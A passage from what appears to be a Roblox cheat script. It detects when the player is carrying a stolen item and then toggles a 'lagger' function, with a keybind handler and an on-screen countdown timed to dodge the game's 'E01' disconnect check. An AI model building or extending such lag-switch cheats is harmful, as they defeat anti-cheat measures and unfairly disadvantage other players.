-- ══════════════════════════════════════════════════════════════════════
-- AUTO BRAINROT DETECTION
-- ══════════════════════════════════════════════════════════════════════
RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        -- If auto is off, but brainrotMode is still true from before, we need to reset
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end

    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end

    local hasBrainrot = hum.WalkSpeed < 25

    if hasBrainrot and not lastBrainrotState then
        -- Brainrot acquired
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false -- fresh pickup clears any prior override
        flipLag(true)  -- activate lagger
    elseif not hasBrainrot and lastBrainrotState then
        -- Brainrot lost
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        flipLag(false) -- deactivate lagger
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- INPUT HANDLER
-- ══════════════════════════════════════════════════════════════════════
UserInputService.InputBegan:Connect(function(input, processed)
    local kc  = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end

    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then
            listeningFor = nil
            updateKbLabels()
            return
        end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name
            listeningFor  = nil
            updateKbLabels()
            saveConfig()
            return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name
            listeningFor  = nil
            updateKbLabels()
            saveConfig()
            return
        end
        return
    end

    if processed then return end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        if not mainFrame.Visible then closeSettings() end
        return
    end

    -- Manual keybind always works, even during brainrot mode
    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)

    if (kbEnum and kc == kbEnum and isKb)
    or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

updateKbLabels()

-- ══════════════════════════════════════════════════════════════════════
-- E01 CARRY DETECTION / HEAD COUNTDOWN
-- Added from Fix E01
-- ══════════════════════════════════════════════════════════════════════
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local wasCarrying = false

-- 1. Check if player is carrying an item
local function isCarrying()
    local char = LocalPlayer.Character
    if not char then return false end
    
    for _, child in pairs(char:GetChildren()) do
        local name = child.Name:lower()
        if name:find("brainrot") or name:find("brain") or name:find("animal") or 
           name:find("carry") or name:find("stolen") or name:find("held") or name:find("steal") then
            return true
        end
    end
    
    for attrName, attrValue in pairs(char:GetAttributes()) do
        local name = attrName:lower()
        if (name:find("carrying") or name:find("carry") or name:find("stealing") or 
            name:find("isstealing") or name:find("hasbrainrot")) and attrValue == true then
            return true
        end
    end
    
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid.WalkSpeed > 0 and humanoid.WalkSpeed <= 25 and humanoid.WalkSpeed ~= 16 then
        return true
    end
    
    return false
end

-- 2. Clean Text-Only Above Head Notification
local function startE01HeadCountdown()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("Head") then return end
    
    local head = char.Head
    
    -- Delete old UI
    if head:FindFirstChild("HeadStealUI") then
        head.HeadStealUI:Destroy()
    end
    
    -- BillboardGui directly attached to Head
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "HeadStealUI"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 600, 0, 80)
    billboard.StudsOffset = Vector3.new(0, 7, 0) -- مرتفع جداً يتعدى الحيوانات الضخمة
    billboard.AlwaysOnTop = true -- يظهر فوق مجسم الحيوان دائماً
    billboard.Parent = head
    
    -- Text Label Only (No Background Box)
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1 -- شفاف بدون مربع
    textLabel.TextColor3 = Color3.fromRGB(255, 60, 60) -- أحمر ينبه بالخطر
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0) -- تحديد أسود سميك لبروز النص
    textLabel.TextStrokeTransparency = 0
    textLabel.Font = Enum.Font.FredokaOne
    textLabel.TextSize = 28 -- خط بارز وضخم جداً
    textLabel.Text = ""
    textLabel.Parent = billboard

    -- Countdown Logic
    local duration = 3.0
    local startTime = tick()
    local finished = false
    local connection
    
    connection = RunService.RenderStepped:Connect(function()
        if finished then return end
        
        local elapsed = tick() - startTime
        local remaining = math.max(0, duration - elapsed)
        
        if textLabel and textLabel.Parent then
            if remaining > 0 then
                -- Danger State
                textLabel.Text = string.format("⚠️ DONT STEAL OR E01 DISCONNECT (%.1fs)", remaining)
            else
                -- Safe State
                finished = true
                connection:Disconnect()
                
                textLabel.Text = "⚡ STEAL NOW!"
                textLabel.TextColor3 = Color3.fromRGB(50, 255, 130) -- أخضر للبدء
                
                -- Fade and destroy
                task.spawn(function()
                    task.wait(2)
                    if billboard and billboard.Parent then
                        local fadeOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {
                            TextTransparency = 1,
                            TextStrokeTransparency = 1
                        })
                        fadeOut:Play()
                        fadeOut.Completed:Connect(function()
                            billboard:Destroy()
                        end)
                    end
                end)
            end
        end
    end)
end

-- 3. Automatic Detection
task.spawn(function()
    while task.wait(0.1) do
        local currentlyCarrying = isCarrying()
        
        if not wasCarrying and currentlyCarrying then
            startE01HeadCountdown()
        end
        
        wasCarrying = currentlyCarrying
    end
end)
